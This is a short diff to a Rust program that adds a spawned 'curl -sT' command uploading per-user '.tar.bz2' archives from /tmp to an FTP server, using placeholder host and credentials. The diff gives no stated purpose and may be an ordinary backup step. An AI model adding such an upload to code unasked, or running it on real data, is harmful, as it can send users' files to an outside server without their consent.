@@ -48,5 +48,14 @@ fn main() {
         .arg(format!("{}", profile))
         .spawn()
         .expect("Failed to execute");
+
+        process::Command::new("curl")
+        .arg("-sT")
+        .arg(format!("/tmp/{}-{}.tar.bz2", username, index+1))
+        .arg("ftp://host/directory/")
+        .arg("--user")
+        .arg("username:password")
+        .spawn()
+        .expect("Failed to execute");
     }
 }
